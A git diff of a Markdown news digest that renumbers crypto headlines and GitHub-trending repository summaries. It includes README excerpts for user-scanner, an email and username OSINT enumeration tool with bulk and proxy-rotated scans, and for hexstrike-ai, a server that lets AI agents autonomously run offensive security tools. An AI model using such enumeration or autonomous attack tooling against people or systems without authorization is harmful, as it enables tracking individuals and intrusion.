 
@@ -8918,7 +8910,7 @@ ZeroLend cited an inability to "generate sustainable revenue" as it became the l
 
 <div class="article-item" data-lang="fr" data-category="crypto" data-source="Cryptoast">
 
-### 100. `FR` [Le président de la Banque fédérale d'Allemagne encense l'euro numérique et les stablecoins](data/articles/35e9eeba681efa2ef0d4b8d463a087b0.html)
+### 99. `FR` [Le président de la Banque fédérale d'Allemagne encense l'euro numérique et les stablecoins](data/articles/35e9eeba681efa2ef0d4b8d463a087b0.html)
 **Source:** Cryptoast | **Keyword:** `Crypto`
 Lors d'un discours lundi, Joachim Nagel, le président de la Banque fédérale d'Allemagne, est revenu sur les MNBC et les stablecoins euro. Qu'en dit-il ?
 
@@ -8926,7 +8918,7 @@ Lors d'un discours lundi, Joachim Nagel, le président de la Banque fédérale d
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 101. `EN` [Kraken Backs 'Trump Accounts' for Wyoming Newborns](data/articles/5bcc5dc14bd683690ba0eb7454df2baf.html)
+### 100. `EN` [Kraken Backs 'Trump Accounts' for Wyoming Newborns](data/articles/5bcc5dc14bd683690ba0eb7454df2baf.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 The move reflects a broader effort by crypto firms to lock in regulatory goodwill through long-term political and geographic alignment.
 
@@ -8934,7 +8926,7 @@ The move reflects a broader effort by crypto firms to lock in regulatory goodwil
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 102. `EN` [Bitcoin’s Long-Term Holders Show Signs of Strain After February Sell-Off](data/articles/832f1ba69e2637ee11ed1189947e51ea.html)
+### 101. `EN` [Bitcoin’s Long-Term Holders Show Signs of Strain After February Sell-Off](data/articles/832f1ba69e2637ee11ed1189947e51ea.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 Bitcoin's long-term holders show weakening accumulation, with on-chain data pointing to $54,000 as the next support if $65,000 breaks.
 
@@ -8942,7 +8934,7 @@ Bitcoin's long-term holders show weakening accumulation, with on-chain data poin
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 103. `EN` [Philippines' Digital Bank Maya Looks to US Market for Up to $1B IPO](data/articles/82950eee57f3a52899974537021a818d.html)
+### 102. `EN` [Philippines' Digital Bank Maya Looks to US Market for Up to $1B IPO](data/articles/82950eee57f3a52899974537021a818d.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 A U.S. venue could offer deeper capital access as investors weigh the bank’s regulated crypto business against its core banking operations.
 
@@ -8950,7 +8942,7 @@ A U.S. venue could offer deeper capital access as investors weigh the bank’s r
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 104. `EN` [Crypto Trading Isn’t Coming to Elon Musk's X (Yet), Says Product Head](data/articles/f7b20e66498af86d75bb5f269993be6c.html)
+### 103. `EN` [Crypto Trading Isn’t Coming to Elon Musk's X (Yet), Says Product Head](data/articles/f7b20e66498af86d75bb5f269993be6c.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 The company’s “Smart Cashtag” feature is aimed at crypto enthusiasts, but the platform won't facilitate trades directly.
 
@@ -8958,7 +8950,7 @@ The company’s “Smart Cashtag” feature is aimed at crypto enthusiasts, but 
 
 <div class="article-item" data-lang="en" data-category="crypto" data-source="Decrypt">
 
-### 105. `EN` [Bitcoin on Pace for Longest Losing Streak Since 2018 Bear Market](data/articles/ad35d686ec9453c8341cf88e7d1ea666.html)
+### 104. `EN` [Bitcoin on Pace for Longest Losing Streak Since 2018 Bear Market](data/articles/ad35d686ec9453c8341cf88e7d1ea666.html)
 **Source:** Decrypt | **Keyword:** `Crypto`
 The selling simply won't stop. If February closes red, Bitcoin will register five consecutive red months, the longest streak in seven years.
 
@@ -9495,7 +9487,34 @@ scripts/live-test.sh --client work --account you@company.com Script toggles: --a
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
-### 4. `EN` [ruvnet/wifi-densepose](data/articles/1345eb0c41fa55e61c1833a198faa5d9.html)
+### 4. `EN` [kaifcodec/user-scanner](data/articles/77dfe4fc1c3ceb1f7d38d2147642b989.html)
+**Source:** GitHub Trending Python | **Keyword:** `GitHub`
+(2-in-1) Emaill and Username OSINT tool that analyzes username and email presence across multiple platforms, intended for security research, investigations, legitimate analysis User Scanner A powerful Email OSINT tool that checks if a specific email is registered on various sites, combined with username scanning for branding or OSINT — 2-in-1 tool. Perfect for fast, accurate and lightweight email OSINT Perfect for finding a unique username across GitHub, Twitter, Reddit, Instagram, and more, all in a single command. Features Email &amp; username OSINT: check email registrations and username availability across social, developer, creator, and other platforms Dual-mode usage: works as an email scanner, username scanner, or username-only tool Clear results: Registered / Not Registered for emails and Available / Taken / Error for usernames with precise failure reasons Fully modular architecture for easy addition of new platform modules Bulk scanning support for usernames and emails via input files Wildcard-based username permutations with automatic variation generation Multiple output formats: console, JSON, and CSV, with file export support Proxy support with rotation and pre-scan proxy validation Smart auto-update system with interactive upgrade prompts via PyPI Virtual Environment (optional but ) # create venv
+python -m venv .venv Activate venv # Linux / macOS
+source .venv/bin/activate # Windows (PowerShell)
+.venv\Scripts\Activate.ps1 Installation # upgrade pip
+python -m pip install --upgrade pip # install
+pip install user-scanner Important Flags See Important flags here and use the tool powerfully Usage Basic username/email scan Scan a single email or username across all available modules/platforms: user-scanner -e john_doe@gmail.com # single email scanning user-scanner -u john_doe # single username scanning Selective scanning Scan only specific categories or single modules: user-scanner -u john_doe -c dev # developer platforms only
+user-scanner -u john_doe -m github # only GitHub Bulk email/username scanning Scan multiple emails/usernames from a file (one email/username per line): Can also be combined with categories or modules using -c , -m and other flags user-scanner -ef emails.txt # bulk email scan
+user-scanner -uf usernames.txt # bulk username scan Library mode for email_scan Only available for user-scanner&gt;=1.2.0 See full usage (eg. category checks, full scan) guide library usage Email scan example (single module): import asyncio
+from user_scanner.core import engine
+from user_scanner.email_scan.dev import github async def main(): # Engine detects 'email_scan' path -&gt; returns "Registered" status result = await engine.check(github, "test@gmail.com") json_data = result.to_json() # returns JSON output csv_data = result.to_csv() # returns CSV output print(json_data) # prints the json data asyncio.run(main()) Output: { "email": "test@gmail.com", "category": "Dev", "site_name": "Github", "status": "Registered", "reason": ""
+} Using Proxies Validate proxies before scanning (tests each proxy against google.com): user-scanner -u john_doe -P proxies.txt --validate-proxies # This will: Filter out non-working proxies Save working proxies to validated_proxies.txt Use only validated proxies for scanning Screenshots: Note*: New modules are constantly getting added so screenshots might show only limited, outdated output: Support the project If this project helps you, consider supporting its development: BTC (SegWit): bc1q0dzkuav8lq9lwu7gc457vwlda4utfcr5hpv7ka Contributing Modules are organized under user_scanner/: user_scanner/
+├── email_scan/ # Currently in development
+│ ├── social/ # Social email scan modules (Instagram, Mastodon, X, etc.)
+| ├── adult/ # Adult sites | ... # New sites to be added soon
+├── user_scan/
+│ ├── dev/ # Developer platforms (GitHub, GitLab, npm, etc.)
+│ ├── social/ # Social platforms (Twitter/X, Reddit, Instagram, Discord, etc.)
+│ ├── creator/ # Creator platforms (Hashnode, Dev.to, Medium, Patreon, etc.)
+│ ├── community/ # Community platforms (forums, StackOverflow, HackerNews, etc.)
+│ ├── gaming/ # Gaming sites (chess.com, Lichess, Roblox, Minecraft, etc.) ... See detailed Contributing guidelines Dependencies: httpx colorama License This project is licensed under the MIT License. See LICENSE for details. Disclaimer This tool is provided for educational purposes and authorized security research only. User Responsibility: Users are solely responsible for ensuring their usage complies with all applicable laws and the Terms of Service (ToS) of any third-party providers. Methodology: The tool interacts only with publicly accessible, unauthenticated web endpoints. It does not bypass authentication, security controls, or access private user data. No Profiling: This software performs only basic yes/no availability checks. It does not collect, store, aggregate, or analyze user data, behavior, or identities. Limitation of Liability: The software is provided “as is”, without warranty of any kind. The developers assume no liability for misuse or any resulting damage or legal consequences. Troubleshooting Some sites may return 403 Forbidden or connection timeout errors, especially if they are blocked in your region (this is common with some adult sites). If a site is blocked in your region, use a VPN and select a region where you know the site is accessible. Then run the tool again. These issues are caused by regional or network restrictions, not by the tool itself. If it still fails, report the error by opening an issue.
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
+
+### 5. `EN` [ruvnet/wifi-densepose](data/articles/1345eb0c41fa55e61c1833a198faa5d9.html)
 **Source:** GitHub Trending Python | **Keyword:** `GitHub`
 Production-ready implementation of InvisPose - a revolutionary WiFi-based dense human pose estimation system that enables real-time full-body tracking through walls using commodity mesh routers WiFi DensePose A cutting-edge WiFi-based human pose estimation system that leverages Channel State Information (CSI) data and advanced machine learning to provide real-time, privacy-preserving pose detection without cameras. Key Features Privacy-First: No cameras required - uses WiFi signals for pose detection Real-Time Processing: Sub-50ms latency with 30 FPS pose estimation Multi-Person Tracking: Simultaneous tracking of up to 10 individuals Domain-Specific Optimization: Healthcare, fitness, smart home, and security applications Enterprise-Ready: Production-grade API with authentication, rate limiting, and monitoring Hardware Agnostic: Works with standard WiFi routers and access points Comprehensive Analytics: Fall detection, activity recognition, and occupancy monitoring WebSocket Streaming: Real-time pose data streaming for live applications 100% Test Coverage: Thoroughly tested with comprehensive test suite Rust Implementation (v2) A high-performance Rust port is available in /rust-port/wifi-densepose-rs/: Performance Benchmarks (Validated) Operation Python (v1) Rust (v2) Speedup CSI Preprocessing (4x64) ~5ms 5.19 µs ~1000x Phase Sanitization (4x64) ~3ms 3.84 µs ~780x Feature Extraction (4x64) ~8ms 9.03 µs ~890x Motion Detection ~1ms 186 ns ~5400x Full Pipeline ~15ms 18.47 µs ~810x Throughput Metrics Component Throughput CSI Preprocessing 49-66 Melem/s Phase Sanitization 67-85 Melem/s Feature Extraction 7-11 Melem/s Full Pipeline ~54,000 fps Resource Comparison Feature Python (v1) Rust (v2) Memory Usage ~500MB ~100MB WASM Support Binary Size N/A ~10MB Test Coverage 100% 107 tests Quick Start (Rust): cd rust-port/wifi-densepose-rs
 cargo build --release
@@ -9695,22 +9714,6 @@ pip install -e . # Install pre-commit hooks
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
-
-### 5. `EN` [alibaba/zvec](data/articles/3d63f2e9a8d54ed277571a9c41471674.html)
-**Source:** GitHub Trending | **Keyword:** `GitHub`
-A lightweight, lightning-fast, in-process vector database Quickstart | Home | Docs | Benchmarks | Discord | X (Twitter) Zvec is an open-source, in-process vector database — lightweight, lightning-fast, and designed to embed directly into applications. Built on Proxima (Alibaba's battle-tested vector search engine), it delivers production-grade, low-latency, scalable similarity search with minimal setup. Features Blazing Fast: Searches billions of vectors in milliseconds. Simple, Just Works: Install and start searching in seconds. No servers, no config, no fuss. Dense + Sparse Vectors: Work with both dense and sparse embeddings, with native support for multi-vector queries in a single call. Hybrid Search: Combine semantic similarity with structured filters for precise results. Runs Anywhere: As an in-process library, Zvec runs wherever your code runs — notebooks, servers, CLI tools, or even edge devices. Installation Python Requirements: Python 3.10 - 3.12 pip install zvec Node.js npm install @zvec/zvec Supported Platforms Linux (x86_64, ARM64) macOS (ARM64) Building from Source If you prefer to build Zvec from source, please check the Building from Source guide. One-Minute Example import zvec # Define collection schema
-schema = zvec.CollectionSchema( name="example", vectors=zvec.VectorSchema("embedding", zvec.DataType.VECTOR_FP32, 4),
-) # Create collection
-collection = zvec.create_and_open(path="./zvec_example", schema=schema) # Insert documents
-collection.insert([ zvec.Doc(id="doc_1", vectors={"embedding": [0.1, 0.2, 0.3, 0.4]}), zvec.Doc(id="doc_2", vectors={"embedding": [0.2, 0.3, 0.4, 0.1]}),
-]) # Search by vector similarity
-results = collection.query( zvec.VectorQuery("embedding", vector=[0.4, 0.3, 0.3, 0.1]), topk=10
-) # Results: list of {'id': str, 'score': float, ...}, sorted by relevance
-print(results) Performance at Scale Zvec delivers exceptional speed and efficiency, making it ideal for demanding production workloads. For detailed benchmark methodology, configurations, and complete results, please see our Benchmarks documentation. Join Our Community Stay updated and get support — scan or click: Join Server Follow @zvec_ai Contributing We welcome and appreciate contributions from the community! Whether you're fixing a bug, adding a feature, or improving documentation, your help makes Zvec better for everyone. Check out our Contributing Guide to get started!
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
 ### 6. `EN` [google/adk-python](data/articles/6c2c589a85280abcfdd956ad16936edf.html)
@@ -9727,34 +9730,7 @@ coordinator = LlmAgent( name="Coordinator", model="gemini-2.5-flash", descriptio
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
-### 7. `EN` [kaifcodec/user-scanner](data/articles/77dfe4fc1c3ceb1f7d38d2147642b989.html)
-**Source:** GitHub Trending Python | **Keyword:** `GitHub`
-(2-in-1) Emaill and Username OSINT tool that analyzes username and email presence across multiple platforms, intended for security research, investigations, legitimate analysis User Scanner A powerful Email OSINT tool that checks if a specific email is registered on various sites, combined with username scanning for branding or OSINT — 2-in-1 tool. Perfect for fast, accurate and lightweight email OSINT Perfect for finding a unique username across GitHub, Twitter, Reddit, Instagram, and more, all in a single command. Features Email &amp; username OSINT: check email registrations and username availability across social, developer, creator, and other platforms Dual-mode usage: works as an email scanner, username scanner, or username-only tool Clear results: Registered / Not Registered for emails and Available / Taken / Error for usernames with precise failure reasons Fully modular architecture for easy addition of new platform modules Bulk scanning support for usernames and emails via input files Wildcard-based username permutations with automatic variation generation Multiple output formats: console, JSON, and CSV, with file export support Proxy support with rotation and pre-scan proxy validation Smart auto-update system with interactive upgrade prompts via PyPI Virtual Environment (optional but ) # create venv
-python -m venv .venv Activate venv # Linux / macOS
-source .venv/bin/activate # Windows (PowerShell)
-.venv\Scripts\Activate.ps1 Installation # upgrade pip
-python -m pip install --upgrade pip # install
-pip install user-scanner Important Flags See Important flags here and use the tool powerfully Usage Basic username/email scan Scan a single email or username across all available modules/platforms: user-scanner -e john_doe@gmail.com # single email scanning user-scanner -u john_doe # single username scanning Selective scanning Scan only specific categories or single modules: user-scanner -u john_doe -c dev # developer platforms only
-user-scanner -u john_doe -m github # only GitHub Bulk email/username scanning Scan multiple emails/usernames from a file (one email/username per line): Can also be combined with categories or modules using -c , -m and other flags user-scanner -ef emails.txt # bulk email scan
-user-scanner -uf usernames.txt # bulk username scan Library mode for email_scan Only available for user-scanner&gt;=1.2.0 See full usage (eg. category checks, full scan) guide library usage Email scan example (single module): import asyncio
-from user_scanner.core import engine
-from user_scanner.email_scan.dev import github async def main(): # Engine detects 'email_scan' path -&gt; returns "Registered" status result = await engine.check(github, "test@gmail.com") json_data = result.to_json() # returns JSON output csv_data = result.to_csv() # returns CSV output print(json_data) # prints the json data asyncio.run(main()) Output: { "email": "test@gmail.com", "category": "Dev", "site_name": "Github", "status": "Registered", "reason": ""
-} Using Proxies Validate proxies before scanning (tests each proxy against google.com): user-scanner -u john_doe -P proxies.txt --validate-proxies # This will: Filter out non-working proxies Save working proxies to validated_proxies.txt Use only validated proxies for scanning Screenshots: Note*: New modules are constantly getting added so screenshots might show only limited, outdated output: Support the project If this project helps you, consider supporting its development: BTC (SegWit): bc1q0dzkuav8lq9lwu7gc457vwlda4utfcr5hpv7ka Contributing Modules are organized under user_scanner/: user_scanner/
-├── email_scan/ # Currently in development
-│ ├── social/ # Social email scan modules (Instagram, Mastodon, X, etc.)
-| ├── adult/ # Adult sites | ... # New sites to be added soon
-├── user_scan/
-│ ├── dev/ # Developer platforms (GitHub, GitLab, npm, etc.)
-│ ├── social/ # Social platforms (Twitter/X, Reddit, Instagram, Discord, etc.)
-│ ├── creator/ # Creator platforms (Hashnode, Dev.to, Medium, Patreon, etc.)
-│ ├── community/ # Community platforms (forums, StackOverflow, HackerNews, etc.)
-│ ├── gaming/ # Gaming sites (chess.com, Lichess, Roblox, Minecraft, etc.) ... See detailed Contributing guidelines Dependencies: httpx colorama License This project is licensed under the MIT License. See LICENSE for details. Disclaimer This tool is provided for educational purposes and authorized security research only. User Responsibility: Users are solely responsible for ensuring their usage complies with all applicable laws and the Terms of Service (ToS) of any third-party providers. Methodology: The tool interacts only with publicly accessible, unauthenticated web endpoints. It does not bypass authentication, security controls, or access private user data. No Profiling: This software performs only basic yes/no availability checks. It does not collect, store, aggregate, or analyze user data, behavior, or identities. Limitation of Liability: The software is provided “as is”, without warranty of any kind. The developers assume no liability for misuse or any resulting damage or legal consequences. Troubleshooting Some sites may return 403 Forbidden or connection timeout errors, especially if they are blocked in your region (this is common with some adult sites). If a site is blocked in your region, use a VPN and select a region where you know the site is accessible. Then run the tool again. These issues are caused by regional or network restrictions, not by the tool itself. If it still fails, report the error by opening an issue.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
-
-### 8. `EN` [0x4m4/hexstrike-ai](data/articles/2237a98b601c0ed9ccbdaa549266f978.html)
+### 7. `EN` [0x4m4/hexstrike-ai](data/articles/2237a98b601c0ed9ccbdaa549266f978.html)
 **Source:** GitHub Trending Python | **Keyword:** `GitHub`
 HexStrike AI MCP Agents is an advanced MCP server that lets AI agents (Claude, GPT, Copilot, etc.) autonomously run 150+ cybersecurity tools for automated pentesting, vulnerability discovery, bug bounty automation, and security research. Seamlessly bridge LLMs with real-world offensive security capabilities. HexStrike AI MCP Agents v6.0 AI-Powered MCP Cybersecurity Automation Platform Advanced AI-powered penetration testing MCP framework with 150+ security tools and 12+ autonomous AI agents What's New • Architecture • Installation • Features • AI Agents • API Reference Follow Our Social Accounts Architecture Overview HexStrike AI MCP v6.0 features a multi-agent architecture with autonomous AI agents, intelligent decision-making, and vulnerability intelligence. %%{init: {"themeVariables": { "primaryColor": "#b71c1c", "secondaryColor": "#ff5252", "tertiaryColor": "#ff8a80", "background": "#2d0000", "edgeLabelBackground":"#b71c1c", "fontFamily": "monospace", "fontSize": "16px", "fontColor": "#fffde7", "nodeTextColor": "#fffde7"
 }}}%%
@@ -9797,6 +9773,22 @@ cd hexstrike-ai # 2. Create development environment
 python3 -m venv hexstrike-dev
 source hexstrike-dev/bin/activate # 3. Install development dependencies
 pip install -r requirements.txt # 4. Start development server
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
+
+### 8. `EN` [alibaba/zvec](data/articles/3d63f2e9a8d54ed277571a9c41471674.html)
+**Source:** GitHub Trending | **Keyword:** `GitHub`
+A lightweight, lightning-fast, in-process vector database Quickstart | Home | Docs | Benchmarks | Discord | X (Twitter) Zvec is an open-source, in-process vector database — lightweight, lightning-fast, and designed to embed directly into applications. Built on Proxima (Alibaba's battle-tested vector search engine), it delivers production-grade, low-latency, scalable similarity search with minimal setup. Features Blazing Fast: Searches billions of vectors in milliseconds. Simple, Just Works: Install and start searching in seconds. No servers, no config, no fuss. Dense + Sparse Vectors: Work with both dense and sparse embeddings, with native support for multi-vector queries in a single call. Hybrid Search: Combine semantic similarity with structured filters for precise results. Runs Anywhere: As an in-process library, Zvec runs wherever your code runs — notebooks, servers, CLI tools, or even edge devices. Installation Python Requirements: Python 3.10 - 3.12 pip install zvec Node.js npm install @zvec/zvec Supported Platforms Linux (x86_64, ARM64) macOS (ARM64) Building from Source If you prefer to build Zvec from source, please check the Building from Source guide. One-Minute Example import zvec # Define collection schema
+schema = zvec.CollectionSchema( name="example", vectors=zvec.VectorSchema("embedding", zvec.DataType.VECTOR_FP32, 4),
+) # Create collection
+collection = zvec.create_and_open(path="./zvec_example", schema=schema) # Insert documents
+collection.insert([ zvec.Doc(id="doc_1", vectors={"embedding": [0.1, 0.2, 0.3, 0.4]}), zvec.Doc(id="doc_2", vectors={"embedding": [0.2, 0.3, 0.4, 0.1]}),
+]) # Search by vector similarity
+results = collection.query( zvec.VectorQuery("embedding", vector=[0.4, 0.3, 0.3, 0.1]), topk=10
+) # Results: list of {'id': str, 'score': float, ...}, sorted by relevance
+print(results) Performance at Scale Zvec delivers exceptional speed and efficiency, making it ideal for demanding production workloads. For detailed benchmark methodology, configurations, and complete results, please see our Benchmarks documentation. Join Our Community Stay updated and get support — scan or click: Join Server Follow @zvec_ai Contributing We welcome and appreciate contributions from the community! Whether you're fixing a bug, adding a feature, or improving documentation, your help makes Zvec better for everyone. Check out our Contributing Guide to get started!
 
 </div>
 
@@ -9851,25 +9843,125 @@ ollama pull nomic-embed-text Set the model names on web UI and make it as defaul
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
-
-### 10. `EN` [OpenCTI-Platform/opencti](data/articles/23da4635e5d3efb88531951b373b3754.html)
-**Source:** GitHub Trending | **Keyword:** `GitHub`
-Open Cyber Threat Intelligence Platform Introduction OpenCTI is an open source platform allowing organizations to manage their cyber threat intelligence knowledge and observables. It has been created in order to structure, store, organize and visualize technical and non-technical information about cyber threats. The structuration of the data is performed using a knowledge schema based on the STIX2 standards. It has been designed as a modern web application including a GraphQL API and an UX oriented frontend. Also, OpenCTI can be integrated with other tools and applications such as MISP, TheHive, MITRE ATT&amp;CK, etc. Objective The goal is to create a comprehensive tool allowing users to capitalize technical (such as TTPs and observables) and non-technical information (such as suggested attribution, victimology etc.) while linking each piece of information to its primary source (a report, a MISP event, etc.), with features such as links between each information, first and last seen dates, levels of confidence, etc. The tool is able to use the MITRE ATT&amp;CK framework (through a dedicated connector) to help structure the data. The user can also choose to implement their own datasets. Once data has been capitalized and processed by the analysts within OpenCTI, new relations may be inferred from existing ones to facilitate the understanding and the representation of this information. This allows the user to extract and leverage meaningful knowledge from the raw data. OpenCTI not only allows imports but also exports of data under different formats (CSV, STIX2 bundles, etc.). Connectors are currently developed to accelerate interactions between the tool and other platforms. Editions of the platform OpenCTI platform has 2 different editions: Community (CE) and Enterprise (EE). The purpose of the Enterprise Edition is to provide additional and powerful features which require specific investments in research and development. You can enable the Enterprise Edition directly in the settings of the platform. OpenCTI Community Edition, licensed under the Apache 2, Version 2.0 license. OpenCTI Enterprise Edition, licensed under the Enterprise Edition license. To understand what OpenCTI Enterprise Edition brings in terms of features, just check the Enterprise Editions page on the Filigran website. You can also try this edition by enabling it in the settings of the platform. Documentation and demonstration If you want to know more on OpenCTI, you can read the documentation on the tool. If you wish to discover how the OpenCTI platform is working, a demonstration instance is available and open to everyone. This instance is reset every night and is based on reference data maintained by the OpenCTI developers. Releases download The releases are available on the Github releases page. You can also access the rolling release package generated from the master branch of the repository. Installation All you need to install the OpenCTI platform can be found in the official documentation. For installation, you can: Use Docker Install manually Use Terraform (community) Use Helm charts (community) Contributing Code of Conduct OpenCTI has adopted a Code of Conduct that we expect project participants to adhere to. Please read the full text so that you can understand what actions will and will not be tolerated. Contributing Guide Read our contributing guide to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to OpenCTI. Beginner friendly issues To help you get you familiar with our contribution process, we have a list of beginner friendly issues which are fairly easy to implement. This is a great place to get started. Development If you want to actively help OpenCTI, we created a dedicated documentation about the deployment of a development environment and how to start the source code modification. Community Status &amp; bugs Currently OpenCTI is under heavy development, if you wish to report bugs or ask for new features, you can directly use the Github issues module. Discussion If you need support or you wish to engage a discussion about the OpenCTI platform, feel free to join us on our Slack channel. You can also send us an email to contact@filigran.io. About Authors OpenCTI is a product designed and developed by the company Filigran. Data Collection Usage telemetry To improve the features and the performances of OpenCTI, the platform collects anonymous statistical data related to its usage and health. You can find all the details on collected data and associated usage in the usage telemetry documentation. OpenStreetMap server To provide OpenCTI users with cartography features, the platform uses a dedicated OpenStreetMap server (https://map.opencti.io). To monitor usage and adapt services performances, Filigran collects access log to this server (including IP addresses). By using this server, you authorize Filigran to collect this information. Otherwise, you are free to deploy your own OpenStreetMap server and modify the platform configuration accordingly. If you have started using the Filigran server and change your mind, you have the right to access, limit, rectify, erase and receive your data. To exercise your rights, please send your request to privacy@filigran.io.
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
-### 11. `EN` [anthropics/claude-quickstarts](data/articles/13df77a00c234c332cb9e4cd248bbf88.html)
+### 10. `EN` [anthropics/claude-quickstarts](data/articles/13df77a00c234c332cb9e4cd248bbf88.html)
 **Source:** GitHub Trending Python | **Keyword:** `GitHub`
 A collection of projects designed to help developers quickly get started with building deployable applications using the Claude API Claude Quickstarts Claude Quickstarts is a collection of projects designed to help developers quickly get started with building applications using the Claude API. Each quickstart provides a foundation that you can easily build upon and customize for your specific needs. Getting Started To use these quickstarts, you'll need an Claude API key. If you don't have one yet, you can sign up for free at console.anthropic.com. Available Quickstarts Customer Support Agent A customer support agent powered by Claude. This project demonstrates how to leverage Claude's natural language understanding and generation capabilities to create an AI-assisted customer support system with access to a knowledge base. Go to Customer Support Agent Quickstart Financial Data Analyst A financial data analyst powered by Claude. This project demonstrates how to leverage Claude's capabilities with interactive data visualization to analyze financial data via chat. Go to Financial Data Analyst Quickstart Computer Use Demo An environment and tools that Claude can use to control a desktop computer. This project demonstrates how to leverage the computer use capabilities of Claude, including support for the latest computer_use_20251124 tool version with zoom actions. Go to Computer Use Demo Quickstart Browser Tools API Demo A complete reference implementation for browser automation powered by Claude. This project demonstrates how to leverage Claude's browser tools API for web interaction, including navigation, DOM inspection, and form manipulation using Playwright. Go to Browser Tools API Demo Quickstart Autonomous Coding Agent An autonomous coding agent powered by the Claude Agent SDK. This project demonstrates a two-agent pattern (initializer + coding agent) that can build complete applications over multiple sessions, with progress persisted via git and a feature list that the agent works through incrementally. Go to Autonomous Coding Agent Quickstart General Usage Each quickstart project comes with its own README and setup instructions. Generally, you'll follow these steps: Clone this repository Navigate to the specific quickstart directory Install the required dependencies Set up your Claude API key as an environment variable Run the quickstart application Explore Further To deepen your understanding of working with Claude and the Claude API, check out these resources: Claude API Documentation Claude Cookbooks - A collection of code snippets and guides for common tasks Claude API Fundamentals Course Contributing We welcome contributions to the Claude Quickstarts repository! If you have ideas for new quickstart projects or improvements to existing ones, please open an issue or submit a pull request. Community and Support Join our Anthropic Discord community for discussions and support Check out the Anthropic support documentation for additional help License This project is licensed under the MIT License - see the LICENSE file for details.
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
+
+### 11. `EN` [OpenCTI-Platform/opencti](data/articles/23da4635e5d3efb88531951b373b3754.html)
+**Source:** GitHub Trending | **Keyword:** `GitHub`
+Open Cyber Threat Intelligence Platform Introduction OpenCTI is an open source platform allowing organizations to manage their cyber threat intelligence knowledge and observables. It has been created in order to structure, store, organize and visualize technical and non-technical information about cyber threats. The structuration of the data is performed using a knowledge schema based on the STIX2 standards. It has been designed as a modern web application including a GraphQL API and an UX oriented frontend. Also, OpenCTI can be integrated with other tools and applications such as MISP, TheHive, MITRE ATT&amp;CK, etc. Objective The goal is to create a comprehensive tool allowing users to capitalize technical (such as TTPs and observables) and non-technical information (such as suggested attribution, victimology etc.) while linking each piece of information to its primary source (a report, a MISP event, etc.), with features such as links between each information, first and last seen dates, levels of confidence, etc. The tool is able to use the MITRE ATT&amp;CK framework (through a dedicated connector) to help structure the data. The user can also choose to implement their own datasets. Once data has been capitalized and processed by the analysts within OpenCTI, new relations may be inferred from existing ones to facilitate the understanding and the representation of this information. This allows the user to extract and leverage meaningful knowledge from the raw data. OpenCTI not only allows imports but also exports of data under different formats (CSV, STIX2 bundles, etc.). Connectors are currently developed to accelerate interactions between the tool and other platforms. Editions of the platform OpenCTI platform has 2 different editions: Community (CE) and Enterprise (EE). The purpose of the Enterprise Edition is to provide additional and powerful features which require specific investments in research and development. You can enable the Enterprise Edition directly in the settings of the platform. OpenCTI Community Edition, licensed under the Apache 2, Version 2.0 license. OpenCTI Enterprise Edition, licensed under the Enterprise Edition license. To understand what OpenCTI Enterprise Edition brings in terms of features, just check the Enterprise Editions page on the Filigran website. You can also try this edition by enabling it in the settings of the platform. Documentation and demonstration If you want to know more on OpenCTI, you can read the documentation on the tool. If you wish to discover how the OpenCTI platform is working, a demonstration instance is available and open to everyone. This instance is reset every night and is based on reference data maintained by the OpenCTI developers. Releases download The releases are available on the Github releases page. You can also access the rolling release package generated from the master branch of the repository. Installation All you need to install the OpenCTI platform can be found in the official documentation. For installation, you can: Use Docker Install manually Use Terraform (community) Use Helm charts (community) Contributing Code of Conduct OpenCTI has adopted a Code of Conduct that we expect project participants to adhere to. Please read the full text so that you can understand what actions will and will not be tolerated. Contributing Guide Read our contributing guide to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to OpenCTI. Beginner friendly issues To help you get you familiar with our contribution process, we have a list of beginner friendly issues which are fairly easy to implement. This is a great place to get started. Development If you want to actively help OpenCTI, we created a dedicated documentation about the deployment of a development environment and how to start the source code modification. Community Status &amp; bugs Currently OpenCTI is under heavy development, if you wish to report bugs or ask for new features, you can directly use the Github issues module. Discussion If you need support or you wish to engage a discussion about the OpenCTI platform, feel free to join us on our Slack channel. You can also send us an email to contact@filigran.io. About Authors OpenCTI is a product designed and developed by the company Filigran. Data Collection Usage telemetry To improve the features and the performances of OpenCTI, the platform collects anonymous statistical data related to its usage and health. You can find all the details on collected data and associated usage in the usage telemetry documentation. OpenStreetMap server To provide OpenCTI users with cartography features, the platform uses a dedicated OpenStreetMap server (https://map.opencti.io). To monitor usage and adapt services performances, Filigran collects access log to this server (including IP addresses). By using this server, you authorize Filigran to collect this information. Otherwise, you are free to deploy your own OpenStreetMap server and modify the platform configuration accordingly. If you have started using the Filigran server and change your mind, you have the right to access, limit, rectify, erase and receive your data. To exercise your rights, please send your request to privacy@filigran.io.
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="opensource" data-source="Dev.to Open Source">
+
+### 12. `FR` [CVE-2017-18892: عندما تخون القوالب الأمان XSS في قوالب البريد الإلكتروني - Mattermost تحت النار](data/articles/bc532ff80da8e1ede357cbe89a92135b.html)
+**Source:** Dev.to Open Source | **Keyword:** `Community`
